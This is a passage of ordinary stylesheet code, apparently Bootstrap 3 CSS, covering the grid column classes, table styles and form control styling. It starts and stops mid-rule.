                font-size: 100%;
                font-weight: bold;
                box-shadow: none;
            }
            pre {
                display: block;
                padding: 9.5px;
                margin: 0 0 10px;
                font-size: 13px;
                line-height: 1.428571429;
                word-break: break-all;
                word-wrap: break-word;
                color: #333333;
                background-color: #f5f5f5;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            pre code {
                padding: 0;
                font-size: inherit;
                color: inherit;
                white-space: pre-wrap;
                background-color: transparent;
                border-radius: 0;
            }
            .pre-scrollable {
                max-height: 340px;
                overflow-y: scroll;
            }
            .container {
                margin-right: auto;
                margin-left: auto;
                padding-left: 15px;
                padding-right: 15px;
            }
            .container:before,
            .container:after {
                content: " ";
                display: table;
            }
            .container:after {
                clear: both;
            }
            @media (min-width: 768px) {
                .container {
                    width: 750px;
                }
            }
            @media (min-width: 992px) {
                .container {
                    width: 970px;
                }
            }
            @media (min-width: 1200px) {
                .container {
                    width: 1170px;
                }
            }
            .container-fluid {
                margin-right: auto;
                margin-left: auto;
                padding-left: 15px;
                padding-right: 15px;
            }
            .container-fluid:before,
            .container-fluid:after {
                content: " ";
                display: table;
            }
            .container-fluid:after {
                clear: both;
            }
            .row {
                margin-left: -15px;
                margin-right: -15px;
            }
            .row:before,
            .row:after {
                content: " ";
                display: table;
            }
            .row:after {
                clear: both;
            }
            .col-xs-1,
            .col-sm-1,
            .col-md-1,
            .col-lg-1,
            .col-xs-2,
            .col-sm-2,
            .col-md-2,
            .col-lg-2,
            .col-xs-3,
            .col-sm-3,
            .col-md-3,
            .col-lg-3,
            .col-xs-4,
            .col-sm-4,
            .col-md-4,
            .col-lg-4,
            .col-xs-5,
            .col-sm-5,
            .col-md-5,
            .col-lg-5,
            .col-xs-6,
            .col-sm-6,
            .col-md-6,
            .col-lg-6,
            .col-xs-7,
            .col-sm-7,
            .col-md-7,
            .col-lg-7,
            .col-xs-8,
            .col-sm-8,
            .col-md-8,
            .col-lg-8,
            .col-xs-9,
            .col-sm-9,
            .col-md-9,
            .col-lg-9,
            .col-xs-10,
            .col-sm-10,
            .col-md-10,
            .col-lg-10,
            .col-xs-11,
            .col-sm-11,
            .col-md-11,
            .col-lg-11,
            .col-xs-12,
            .col-sm-12,
            .col-md-12,
            .col-lg-12 {
                position: relative;
                min-height: 1px;
                padding-left: 15px;
                padding-right: 15px;
            }
            .col-xs-1,
            .col-xs-2,
            .col-xs-3,
            .col-xs-4,
            .col-xs-5,
            .col-xs-6,
            .col-xs-7,
            .col-xs-8,
            .col-xs-9,
            .col-xs-10,
            .col-xs-11,
            .col-xs-12 {
                float: left;
            }
            .col-xs-1 {
                width: 8.3333333333%;
            }
            .col-xs-2 {
                width: 16.6666666667%;
            }
            .col-xs-3 {
                width: 25%;
            }
            .col-xs-4 {
                width: 33.3333333333%;
            }
            .col-xs-5 {
                width: 41.6666666667%;
            }
            .col-xs-6 {
                width: 50%;
            }
            .col-xs-7 {
                width: 58.3333333333%;
            }
            .col-xs-8 {
                width: 66.6666666667%;
            }
            .col-xs-9 {
                width: 75%;
            }
            .col-xs-10 {
                width: 83.3333333333%;
            }
            .col-xs-11 {
                width: 91.6666666667%;
            }
            .col-xs-12 {
                width: 100%;
            }
            .col-xs-pull-0 {
                right: auto;
            }
            .col-xs-pull-1 {
                right: 8.3333333333%;
            }
            .col-xs-pull-2 {
                right: 16.6666666667%;
            }
            .col-xs-pull-3 {
                right: 25%;
            }
            .col-xs-pull-4 {
                right: 33.3333333333%;
            }
            .col-xs-pull-5 {
                right: 41.6666666667%;
            }
            .col-xs-pull-6 {
                right: 50%;
            }
            .col-xs-pull-7 {
                right: 58.3333333333%;
            }
            .col-xs-pull-8 {
                right: 66.6666666667%;
            }
            .col-xs-pull-9 {
                right: 75%;
            }
            .col-xs-pull-10 {
                right: 83.3333333333%;
            }
            .col-xs-pull-11 {
                right: 91.6666666667%;
            }
            .col-xs-pull-12 {
                right: 100%;
            }
            .col-xs-push-0 {
                left: auto;
            }
            .col-xs-push-1 {
                left: 8.3333333333%;
            }
            .col-xs-push-2 {
                left: 16.6666666667%;
            }
            .col-xs-push-3 {
                left: 25%;
            }
            .col-xs-push-4 {
                left: 33.3333333333%;
            }
            .col-xs-push-5 {
                left: 41.6666666667%;
            }
            .col-xs-push-6 {
                left: 50%;
            }
            .col-xs-push-7 {
                left: 58.3333333333%;
            }
            .col-xs-push-8 {
                left: 66.6666666667%;
            }
            .col-xs-push-9 {
                left: 75%;
            }
            .col-xs-push-10 {
                left: 83.3333333333%;
            }
            .col-xs-push-11 {
                left: 91.6666666667%;
            }
            .col-xs-push-12 {
                left: 100%;
            }
            .col-xs-offset-0 {
                margin-left: 0%;
            }
            .col-xs-offset-1 {
                margin-left: 8.3333333333%;
            }
            .col-xs-offset-2 {
                margin-left: 16.6666666667%;
            }
            .col-xs-offset-3 {
                margin-left: 25%;
            }
            .col-xs-offset-4 {
                margin-left: 33.3333333333%;
            }
            .col-xs-offset-5 {
                margin-left: 41.6666666667%;
            }
            .col-xs-offset-6 {
                margin-left: 50%;
            }
            .col-xs-offset-7 {
                margin-left: 58.3333333333%;
            }
            .col-xs-offset-8 {
                margin-left: 66.6666666667%;
            }
            .col-xs-offset-9 {
                margin-left: 75%;
            }
            .col-xs-offset-10 {
                margin-left: 83.3333333333%;
            }
            .col-xs-offset-11 {
                margin-left: 91.6666666667%;
            }
            .col-xs-offset-12 {
                margin-left: 100%;
            }
            @media (min-width: 768px) {
                .col-sm-1,
                .col-sm-2,
                .col-sm-3,
                .col-sm-4,
                .col-sm-5,
                .col-sm-6,
                .col-sm-7,
                .col-sm-8,
                .col-sm-9,
                .col-sm-10,
                .col-sm-11,
                .col-sm-12 {
                    float: left;
                }
                .col-sm-1 {
                    width: 8.3333333333%;
                }
                .col-sm-2 {
                    width: 16.6666666667%;
                }
                .col-sm-3 {
                    width: 25%;
                }
                .col-sm-4 {
                    width: 33.3333333333%;
                }
                .col-sm-5 {
                    width: 41.6666666667%;
                }
                .col-sm-6 {
                    width: 50%;
                }
                .col-sm-7 {
                    width: 58.3333333333%;
                }
                .col-sm-8 {
                    width: 66.6666666667%;
                }
                .col-sm-9 {
                    width: 75%;
                }
                .col-sm-10 {
                    width: 83.3333333333%;
                }
                .col-sm-11 {
                    width: 91.6666666667%;
                }
                .col-sm-12 {
                    width: 100%;
                }
                .col-sm-pull-0 {
                    right: auto;
                }
                .col-sm-pull-1 {
                    right: 8.3333333333%;
                }
                .col-sm-pull-2 {
                    right: 16.6666666667%;
                }
                .col-sm-pull-3 {
                    right: 25%;
                }
                .col-sm-pull-4 {
                    right: 33.3333333333%;
                }
                .col-sm-pull-5 {
                    right: 41.6666666667%;
                }
                .col-sm-pull-6 {
                    right: 50%;
                }
                .col-sm-pull-7 {
                    right: 58.3333333333%;
                }
                .col-sm-pull-8 {
                    right: 66.6666666667%;
                }
                .col-sm-pull-9 {
                    right: 75%;
                }
                .col-sm-pull-10 {
                    right: 83.3333333333%;
                }
                .col-sm-pull-11 {
                    right: 91.6666666667%;
                }
                .col-sm-pull-12 {
                    right: 100%;
                }
                .col-sm-push-0 {
                    left: auto;
                }
                .col-sm-push-1 {
                    left: 8.3333333333%;
                }
                .col-sm-push-2 {
                    left: 16.6666666667%;
                }
                .col-sm-push-3 {
                    left: 25%;
                }
                .col-sm-push-4 {
                    left: 33.3333333333%;
                }
                .col-sm-push-5 {
                    left: 41.6666666667%;
                }
                .col-sm-push-6 {
                    left: 50%;
                }
                .col-sm-push-7 {
                    left: 58.3333333333%;
                }
                .col-sm-push-8 {
                    left: 66.6666666667%;
                }
                .col-sm-push-9 {
                    left: 75%;
                }
                .col-sm-push-10 {
                    left: 83.3333333333%;
                }
                .col-sm-push-11 {
                    left: 91.6666666667%;
                }
                .col-sm-push-12 {
                    left: 100%;
                }
                .col-sm-offset-0 {
                    margin-left: 0%;
                }
                .col-sm-offset-1 {
                    margin-left: 8.3333333333%;
                }
                .col-sm-offset-2 {
                    margin-left: 16.6666666667%;
                }
                .col-sm-offset-3 {
                    margin-left: 25%;
                }
                .col-sm-offset-4 {
                    margin-left: 33.3333333333%;
                }
                .col-sm-offset-5 {
                    margin-left: 41.6666666667%;
                }
                .col-sm-offset-6 {
                    margin-left: 50%;
                }
                .col-sm-offset-7 {
                    margin-left: 58.3333333333%;
                }
                .col-sm-offset-8 {
                    margin-left: 66.6666666667%;
                }
                .col-sm-offset-9 {
                    margin-left: 75%;
                }
                .col-sm-offset-10 {
                    margin-left: 83.3333333333%;
                }
                .col-sm-offset-11 {
                    margin-left: 91.6666666667%;
                }
                .col-sm-offset-12 {
                    margin-left: 100%;
                }
            }
            @media (min-width: 992px) {
                .col-md-1,
                .col-md-2,
                .col-md-3,
                .col-md-4,
                .col-md-5,
                .col-md-6,
                .col-md-7,
                .col-md-8,
                .col-md-9,
                .col-md-10,
                .col-md-11,
                .col-md-12 {
                    float: left;
                }
                .col-md-1 {
                    width: 8.3333333333%;
                }
                .col-md-2 {
                    width: 16.6666666667%;
                }
                .col-md-3 {
                    width: 25%;
                }
                .col-md-4 {
                    width: 33.3333333333%;
                }
                .col-md-5 {
                    width: 41.6666666667%;
                }
                .col-md-6 {
                    width: 50%;
                }
                .col-md-7 {
                    width: 58.3333333333%;
                }
                .col-md-8 {
                    width: 66.6666666667%;
                }
                .col-md-9 {
                    width: 75%;
                }
                .col-md-10 {
                    width: 83.3333333333%;
                }
                .col-md-11 {
                    width: 91.6666666667%;
                }
                .col-md-12 {
                    width: 100%;
                }
                .col-md-pull-0 {
                    right: auto;
                }
                .col-md-pull-1 {
                    right: 8.3333333333%;
                }
                .col-md-pull-2 {
                    right: 16.6666666667%;
                }
                .col-md-pull-3 {
                    right: 25%;
                }
                .col-md-pull-4 {
                    right: 33.3333333333%;
                }
                .col-md-pull-5 {
                    right: 41.6666666667%;
                }
                .col-md-pull-6 {
                    right: 50%;
                }
                .col-md-pull-7 {
                    right: 58.3333333333%;
                }
                .col-md-pull-8 {
                    right: 66.6666666667%;
                }
                .col-md-pull-9 {
                    right: 75%;
                }
                .col-md-pull-10 {
                    right: 83.3333333333%;
                }
                .col-md-pull-11 {
                    right: 91.6666666667%;
                }
                .col-md-pull-12 {
                    right: 100%;
                }
                .col-md-push-0 {
                    left: auto;
                }
                .col-md-push-1 {
                    left: 8.3333333333%;
                }
                .col-md-push-2 {
                    left: 16.6666666667%;
                }
                .col-md-push-3 {
                    left: 25%;
                }
                .col-md-push-4 {
                    left: 33.3333333333%;
                }
                .col-md-push-5 {
                    left: 41.6666666667%;
                }
                .col-md-push-6 {
                    left: 50%;
                }
                .col-md-push-7 {
                    left: 58.3333333333%;
                }
                .col-md-push-8 {
                    left: 66.6666666667%;
                }
                .col-md-push-9 {
                    left: 75%;
                }
                .col-md-push-10 {
                    left: 83.3333333333%;
                }
                .col-md-push-11 {
                    left: 91.6666666667%;
                }
                .col-md-push-12 {
                    left: 100%;
                }
                .col-md-offset-0 {
                    margin-left: 0%;
                }
                .col-md-offset-1 {
                    margin-left: 8.3333333333%;
                }
                .col-md-offset-2 {
                    margin-left: 16.6666666667%;
                }
                .col-md-offset-3 {
                    margin-left: 25%;
                }
                .col-md-offset-4 {
                    margin-left: 33.3333333333%;
                }
                .col-md-offset-5 {
                    margin-left: 41.6666666667%;
                }
                .col-md-offset-6 {
                    margin-left: 50%;
                }
                .col-md-offset-7 {
                    margin-left: 58.3333333333%;
                }
                .col-md-offset-8 {
                    margin-left: 66.6666666667%;
                }
                .col-md-offset-9 {
                    margin-left: 75%;
                }
                .col-md-offset-10 {
                    margin-left: 83.3333333333%;
                }
                .col-md-offset-11 {
                    margin-left: 91.6666666667%;
                }
                .col-md-offset-12 {
                    margin-left: 100%;
                }
            }
            @media (min-width: 1200px) {
                .col-lg-1,
                .col-lg-2,
                .col-lg-3,
                .col-lg-4,
                .col-lg-5,
                .col-lg-6,
                .col-lg-7,
                .col-lg-8,
                .col-lg-9,
                .col-lg-10,
                .col-lg-11,
                .col-lg-12 {
                    float: left;
                }
                .col-lg-1 {
                    width: 8.3333333333%;
                }
                .col-lg-2 {
                    width: 16.6666666667%;
                }
                .col-lg-3 {
                    width: 25%;
                }
                .col-lg-4 {
                    width: 33.3333333333%;
                }
                .col-lg-5 {
                    width: 41.6666666667%;
                }
                .col-lg-6 {
                    width: 50%;
                }
                .col-lg-7 {
                    width: 58.3333333333%;
                }
                .col-lg-8 {
                    width: 66.6666666667%;
                }
                .col-lg-9 {
                    width: 75%;
                }
                .col-lg-10 {
                    width: 83.3333333333%;
                }
                .col-lg-11 {
                    width: 91.6666666667%;
                }
                .col-lg-12 {
                    width: 100%;
                }
                .col-lg-pull-0 {
                    right: auto;
                }
                .col-lg-pull-1 {
                    right: 8.3333333333%;
                }
                .col-lg-pull-2 {
                    right: 16.6666666667%;
                }
                .col-lg-pull-3 {
                    right: 25%;
                }
                .col-lg-pull-4 {
                    right: 33.3333333333%;
                }
                .col-lg-pull-5 {
                    right: 41.6666666667%;
                }
                .col-lg-pull-6 {
                    right: 50%;
                }
                .col-lg-pull-7 {
                    right: 58.3333333333%;
                }
                .col-lg-pull-8 {
                    right: 66.6666666667%;
                }
                .col-lg-pull-9 {
                    right: 75%;
                }
                .col-lg-pull-10 {
                    right: 83.3333333333%;
                }
                .col-lg-pull-11 {
                    right: 91.6666666667%;
                }
                .col-lg-pull-12 {
                    right: 100%;
                }
                .col-lg-push-0 {
                    left: auto;
                }
                .col-lg-push-1 {
                    left: 8.3333333333%;
                }
                .col-lg-push-2 {
                    left: 16.6666666667%;
                }
                .col-lg-push-3 {
                    left: 25%;
                }
                .col-lg-push-4 {
                    left: 33.3333333333%;
                }
                .col-lg-push-5 {
                    left: 41.6666666667%;
                }
                .col-lg-push-6 {
                    left: 50%;
                }
                .col-lg-push-7 {
                    left: 58.3333333333%;
                }
                .col-lg-push-8 {
                    left: 66.6666666667%;
                }
                .col-lg-push-9 {
                    left: 75%;
                }
                .col-lg-push-10 {
                    left: 83.3333333333%;
                }
                .col-lg-push-11 {
                    left: 91.6666666667%;
                }
                .col-lg-push-12 {
                    left: 100%;
                }
                .col-lg-offset-0 {
                    margin-left: 0%;
                }
                .col-lg-offset-1 {
                    margin-left: 8.3333333333%;
                }
                .col-lg-offset-2 {
                    margin-left: 16.6666666667%;
                }
                .col-lg-offset-3 {
                    margin-left: 25%;
                }
                .col-lg-offset-4 {
                    margin-left: 33.3333333333%;
                }
                .col-lg-offset-5 {
                    margin-left: 41.6666666667%;
                }
                .col-lg-offset-6 {
                    margin-left: 50%;
                }
                .col-lg-offset-7 {
                    margin-left: 58.3333333333%;
                }
                .col-lg-offset-8 {
                    margin-left: 66.6666666667%;
                }
                .col-lg-offset-9 {
                    margin-left: 75%;
                }
                .col-lg-offset-10 {
                    margin-left: 83.3333333333%;
                }
                .col-lg-offset-11 {
                    margin-left: 91.6666666667%;
                }
                .col-lg-offset-12 {
                    margin-left: 100%;
                }
            }
            table {
                background-color: transparent;
            }
            caption {
                padding-top: 8px;
                padding-bottom: 8px;
                color: #777777;
                text-align: left;
            }
            th {
                text-align: left;
            }
            .table {
                width: 100%;
                max-width: 100%;
                margin-bottom: 20px;
            }
            .table > thead > tr > th,
            .table > thead > tr > td,
            .table > tbody > tr > th,
            .table > tbody > tr > td,
            .table > tfoot > tr > th,
            .table > tfoot > tr > td {
                padding: 8px;
                line-height: 1.428571429;
                vertical-align: top;
                border-top: 1px solid #ddd;
            }
            .table > thead > tr > th {
                vertical-align: bottom;
                border-bottom: 2px solid #ddd;
            }
            .table > caption + thead > tr:first-child > th,
            .table > caption + thead > tr:first-child > td,
            .table > colgroup + thead > tr:first-child > th,
            .table > colgroup + thead > tr:first-child > td,
            .table > thead:first-child > tr:first-child > th,
            .table > thead:first-child > tr:first-child > td {
                border-top: 0;
            }
            .table > tbody + tbody {
                border-top: 2px solid #ddd;
            }
            .table .table {
                background-color: #fff;
            }
            .table-condensed > thead > tr > th,
            .table-condensed > thead > tr > td,
            .table-condensed > tbody > tr > th,
            .table-condensed > tbody > tr > td,
            .table-condensed > tfoot > tr > th,
            .table-condensed > tfoot > tr > td {
                padding: 5px;
            }
            .table-bordered {
                border: 1px solid #ddd;
            }
            .table-bordered > thead > tr > th,
            .table-bordered > thead > tr > td,
            .table-bordered > tbody > tr > th,
            .table-bordered > tbody > tr > td,
            .table-bordered > tfoot > tr > th,
            .table-bordered > tfoot > tr > td {
                border: 1px solid #ddd;
            }
            .table-bordered > thead > tr > th,
            .table-bordered > thead > tr > td {
                border-bottom-width: 2px;
            }
            .table-striped > tbody > tr:nth-of-type(odd) {
                background-color: #f9f9f9;
            }
            .table-hover > tbody > tr:hover {
                background-color: #f5f5f5;
            }
            table col[class*="col-"] {
                position: static;
                float: none;
                display: table-column;
            }
            table td[class*="col-"],
            table th[class*="col-"] {
                position: static;
                float: none;
                display: table-cell;
            }
            .table > thead > tr > td.active,
            .table > thead > tr > th.active,
            .table > thead > tr.active > td,
            .table > thead > tr.active > th,
            .table > tbody > tr > td.active,
            .table > tbody > tr > th.active,
            .table > tbody > tr.active > td,
            .table > tbody > tr.active > th,
            .table > tfoot > tr > td.active,
            .table > tfoot > tr > th.active,
            .table > tfoot > tr.active > td,
            .table > tfoot > tr.active > th {
                background-color: #f5f5f5;
            }
            .table-hover > tbody > tr > td.active:hover,
            .table-hover > tbody > tr > th.active:hover,
            .table-hover > tbody > tr.active:hover > td,
            .table-hover > tbody > tr:hover > .active,
            .table-hover > tbody > tr.active:hover > th {
                background-color: #e8e8e8;
            }
            .table > thead > tr > td.success,
            .table > thead > tr > th.success,
            .table > thead > tr.success > td,
            .table > thead > tr.success > th,
            .table > tbody > tr > td.success,
            .table > tbody > tr > th.success,
            .table > tbody > tr.success > td,
            .table > tbody > tr.success > th,
            .table > tfoot > tr > td.success,
            .table > tfoot > tr > th.success,
            .table > tfoot > tr.success > td,
            .table > tfoot > tr.success > th {
                background-color: #dff0d8;
            }
            .table-hover > tbody > tr > td.success:hover,
            .table-hover > tbody > tr > th.success:hover,
            .table-hover > tbody > tr.success:hover > td,
            .table-hover > tbody > tr:hover > .success,
            .table-hover > tbody > tr.success:hover > th {
                background-color: #d0e9c6;
            }
            .table > thead > tr > td.info,
            .table > thead > tr > th.info,
            .table > thead > tr.info > td,
            .table > thead > tr.info > th,
            .table > tbody > tr > td.info,
            .table > tbody > tr > th.info,
            .table > tbody > tr.info > td,
            .table > tbody > tr.info > th,
            .table > tfoot > tr > td.info,
            .table > tfoot > tr > th.info,
            .table > tfoot > tr.info > td,
            .table > tfoot > tr.info > th {
                background-color: #d9edf7;
            }
            .table-hover > tbody > tr > td.info:hover,
            .table-hover > tbody > tr > th.info:hover,
            .table-hover > tbody > tr.info:hover > td,
            .table-hover > tbody > tr:hover > .info,
            .table-hover > tbody > tr.info:hover > th {
                background-color: #c4e3f3;
            }
            .table > thead > tr > td.warning,
            .table > thead > tr > th.warning,
            .table > thead > tr.warning > td,
            .table > thead > tr.warning > th,
            .table > tbody > tr > td.warning,
            .table > tbody > tr > th.warning,
            .table > tbody > tr.warning > td,
            .table > tbody > tr.warning > th,
            .table > tfoot > tr > td.warning,
            .table > tfoot > tr > th.warning,
            .table > tfoot > tr.warning > td,
            .table > tfoot > tr.warning > th {
                background-color: #fcf8e3;
            }
            .table-hover > tbody > tr > td.warning:hover,
            .table-hover > tbody > tr > th.warning:hover,
            .table-hover > tbody > tr.warning:hover > td,
            .table-hover > tbody > tr:hover > .warning,
            .table-hover > tbody > tr.warning:hover > th {
                background-color: #faf2cc;
            }
            .table > thead > tr > td.danger,
            .table > thead > tr > th.danger,
            .table > thead > tr.danger > td,
            .table > thead > tr.danger > th,
            .table > tbody > tr > td.danger,
            .table > tbody > tr > th.danger,
            .table > tbody > tr.danger > td,
            .table > tbody > tr.danger > th,
            .table > tfoot > tr > td.danger,
            .table > tfoot > tr > th.danger,
            .table > tfoot > tr.danger > td,
            .table > tfoot > tr.danger > th {
                background-color: #f2dede;
            }
            .table-hover > tbody > tr > td.danger:hover,
            .table-hover > tbody > tr > th.danger:hover,
            .table-hover > tbody > tr.danger:hover > td,
            .table-hover > tbody > tr:hover > .danger,
            .table-hover > tbody > tr.danger:hover > th {
                background-color: #ebcccc;
            }
            .table-responsive {
                overflow-x: auto;
                min-height: 0.01%;
            }
            @media screen and (max-width: 767px) {
                .table-responsive {
                    width: 100%;
                    margin-bottom: 15px;
                    overflow-y: hidden;
                    -ms-overflow-style: -ms-autohiding-scrollbar;
                    border: 1px solid #ddd;
                }
                .table-responsive > .table {
                    margin-bottom: 0;
                }
                .table-responsive > .table > thead > tr > th,
                .table-responsive > .table > thead > tr > td,
                .table-responsive > .table > tbody > tr > th,
                .table-responsive > .table > tbody > tr > td,
                .table-responsive > .table > tfoot > tr > th,
                .table-responsive > .table > tfoot > tr > td {
                    white-space: nowrap;
                }
                .table-responsive > .table-bordered {
                    border: 0;
                }
                .table-responsive > .table-bordered > thead > tr > th:first-child,
                .table-responsive > .table-bordered > thead > tr > td:first-child,
                .table-responsive > .table-bordered > tbody > tr > th:first-child,
                .table-responsive > .table-bordered > tbody > tr > td:first-child,
                .table-responsive > .table-bordered > tfoot > tr > th:first-child,
                .table-responsive > .table-bordered > tfoot > tr > td:first-child {
                    border-left: 0;
                }
                .table-responsive > .table-bordered > thead > tr > th:last-child,
                .table-responsive > .table-bordered > thead > tr > td:last-child,
                .table-responsive > .table-bordered > tbody > tr > th:last-child,
                .table-responsive > .table-bordered > tbody > tr > td:last-child,
                .table-responsive > .table-bordered > tfoot > tr > th:last-child,
                .table-responsive > .table-bordered > tfoot > tr > td:last-child {
                    border-right: 0;
                }
                .table-responsive > .table-bordered > tbody > tr:last-child > th,
                .table-responsive > .table-bordered > tbody > tr:last-child > td,
                .table-responsive > .table-bordered > tfoot > tr:last-child > th,
                .table-responsive > .table-bordered > tfoot > tr:last-child > td {
                    border-bottom: 0;
                }
            }
            fieldset {
                padding: 0;
                margin: 0;
                border: 0;
                min-width: 0;
            }
            legend {
                display: block;
                width: 100%;
                padding: 0;
                margin-bottom: 20px;
                font-size: 21px;
                line-height: inherit;
                color: #333333;
                border: 0;
                border-bottom: 1px solid #e5e5e5;
            }
            label {
                display: inline-block;
                max-width: 100%;
                margin-bottom: 5px;
                font-weight: bold;
            }
            input[type="search"] {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            input[type="radio"],
            input[type="checkbox"] {
                margin: 4px 0 0;
                margin-top: 1px \9;
                line-height: normal;
            }
            input[type="file"] {
                display: block;
            }
            input[type="range"] {
                display: block;
                width: 100%;
            }
            select[multiple],
            select[size] {
                height: auto;
            }
            input[type="file"]:focus,
            input[type="radio"]:focus,
            input[type="checkbox"]:focus {
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            output {
                display: block;
                padding-top: 7px;
                font-size: 14px;
                line-height: 1.428571429;
                color: #555555;
            }
            .form-control {
                display: block;
                width: 100%;
                height: 34px;
                padding: 6px 12px;
                font-size: 14px;
                line-height: 1.428571429;
                color: #555555;
                background-color: #fff;
                background-image: none;
                border: 1px solid #ccc;
                border-radius: 4px;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
                -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
                transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            }
            .form-control:focus {
                border-color: #66afe9;
                outline: 0;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
            }
            .form-control::-moz-placeholder {
                color: #999;
                opacity: 1;
            }
            .form-control:-ms-input-placeholder {
                color: #999;
            }
            .form-control::-webkit-input-placeholder {
                color: #999;
            }
            .form-control::-ms-expand {
                border: 0;
                background-color: transparent;
            }
            .form-control[disabled],
            .form-control[readonly],
            fieldset[disabled] .form-control {
                background-color: #eeeeee;
                opacity: 1;
            }
            .form-control[disabled],
            fieldset[disabled] .form-control {
                cursor: not-allowed;
            }
            textarea.form-control {
                height: auto;
            }
            input[type="search"] {
                -webkit-appearance: none;
            }
            @media screen and (-webkit-min-device-pixel-ratio: 0) {
                input.form-control[type="date"],
                input.form-control[type="time"],
                input.form-control[type="datetime-local"],
                input.form-control[type="month"] {
                    line-height: 34px;
                }
                input.input-sm[type="date"],
                .input-group-sm > .form-control[type="date"],
                .input-group-sm > .input-group-addon[type="date"],
                .input-group-sm > .input-group-btn > .btn[type="date"],
                .input-group-sm input[type="date"],
                input.input-sm[type="time"],
                .input-group-sm > .form-control[type="time"],
                .input-group-sm > .input-group-addon[type="time"],
                .input-group-sm > .input-group-btn > .btn[type="time"],
                .input-group-sm input[type="time"],
                input.input-sm[type="datetime-local"],
                .input-group-sm > .form-control[type="datetime-local"],
                .input-group-sm > .input-group-addon[type="datetime-local"],
                .input-group-sm > .input-group-btn > .btn[type="datetime-local"],
                .input-group-sm input[type="datetime-local"],
                input.input-sm[type="month"],
                .input-group-sm > .form-control[type="month"],
                .input-group-sm > .input-group-addon[type="month"],
                .input-group-sm > .input-group-btn > .btn[type="month"],
                .input-group-sm input[type="month"] {
                    line-height: 30px;
                }
                input.input-lg[type="date"],
                .input-group-lg > .form-control[type="date"],
                .input-group-lg > .input-group-addon[type="date"],
                .input-group-lg > .input-group-btn > .btn[type="date"],
                .input-group-lg input[type="date"],
                input.input-lg[type="time"],
                .input-group-lg > .form-control[type="time"],
                .input-group-lg > .input-group-addon[type="time"],
                .input-group-lg > .input-group-btn > .btn[type="time"],
                .input-group-lg input[type="time"],
                input.input-lg[type="datetime-local"],
                .input-group-lg > .form-control[type="datetime-local"],
                .input-group-lg > .input-group-addon[type="datetime-local"],
                .input-group-lg > .input-group-btn > .btn[type="datetime-local"],
                .input-group-lg input[type="datetime-local"],
                input.input-lg[type="month"],
                .input-group-lg > .form-control[type="month"],
                .input-group-lg > .input-group-addon[type="month"],
                .input-group-lg > .input-group-btn > .btn[type="month"],
                .input-group-lg input[type="month"] {
                    line-height: 46px;
                }
            }
            .form-group {
                margin-bottom: 15px;
            }
            .radio,
            .checkbox {
                position: relative;
                display: block;
                margin-top: 10px;
                margin-bottom: 10px;
            }
            .radio label,
            .checkbox label {
                min-height: 20px;
                padding-left: 20px;
                margin-bottom: 0;
                font-weight: normal;
                cursor: pointer;
            }
            .radio input[type="radio"],
            .radio-inline input[type="radio"],
            .checkbox input[type="checkbox"],
            .checkbox-inline input[type="checkbox"] {
                position: absolute;
                margin-left: -20px;
                margin-top: 4px \9;
            }
            .radio + .radio,
            .checkbox + .checkbox {
                margin-top: -5px;
            }
            .radio-inline,
            .checkbox-inline {
                position: relative;
                display: inline-block;
                padding-left: 20px;
                margin-bottom: 0;
                vertical-align: middle;
                font-weight: normal;
                cursor: pointer;
            }
            .radio-inline + .radio-inline,
            .checkbox-inline + .checkbox-inline {
                margin-top: 0;
                margin-left: 10px;
            }
            input[type="radio"][disabled],
            input.disabled[type="radio"],
            fieldset[disabled] input[type="radio"],
            input[type="checkbox"][disabled],
            input.disabled[type="checkbox"],
            fieldset[disabled] input[type="checkbox"] {
                cursor: not-allowed;
            }
            .radio-inline.disabled,
            fieldset[disabled] .radio-inline,
            .checkbox-inline.disabled,
            fieldset[disabled] .checkbox-inline {
                cursor: not-allowed;
            }
            .radio.disabled label,
            fieldset[disabled] .radio label,
            .checkbox.disabled label,
            fieldset[disabled] .checkbox label {
                cursor: not-allowed;
            }
            .form-control-static {
                padding-top: 7px;
                padding-bottom: 7px;
                margin-bottom: 0;
                min-height: 34px;
            }
            .form-control-static.input-lg,
            .input-group-lg > .form-control-static.form-control,
            .input-group-lg > .form-control-static.input-group-addon,
            .input-group-lg > .input-group-btn > .form-control-static.btn,
            .form-control-static.input-sm,
            .input-group-sm > .form-control-static.form-control,
            .input-group-sm > .form-control-static.input-group-addon,
            .input-group-sm > .input-group-btn > .form-control-static.btn {
                padding-left: 0;
                padding-right: 0;
            }
            .input-sm,
            .input-group-sm > .form-control,
            .input-group-sm > .input-group-addon,
            .input-group-sm > .input-group-btn > .btn {
                height: 30px;
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            select.input-sm,
            .input-group-sm > select.form-control,
            .input-group-sm > select.input-group-addon,
            .input-group-sm > .input-group-btn > select.btn {
                height: 30px;
                line-height: 30px;
            }
            textarea.input-sm,
            .input-group-sm > textarea.form-control,
            .input-group-sm > textarea.input-group-addon,
            .input-group-sm > .input-group-btn > textarea.btn,
            select.input-sm[multiple],
            .input-group-sm > .form-control[multiple],
            .input-group-sm > .input-group-addon[multiple],
            .input-group-sm > .input-group-btn > .btn[multiple] {
                height: auto;
            }
            .form-group-sm .form-control {
                height: 30px;
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .form-group-sm select.form-control {
                height: 30px;
                line-height: 30px;
            }
            .form-group-sm textarea.form-control,
            .form-group-sm select.form-control[multiple] {
                height: auto;
            }
            .form-group-sm .form-control-static {
                height: 30px;
                min-height: 32px;
                padding: 6px 10px;
                font-size: 12px;
                line-height: 1.5;
            }
            .input-lg,
            .input-group-lg > .form-control,
            .input-group-lg > .input-group-addon,
            .input-group-lg > .input-group-btn > .btn {
                height: 46px;
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            select.input-lg,
            .input-group-lg > select.form-control,
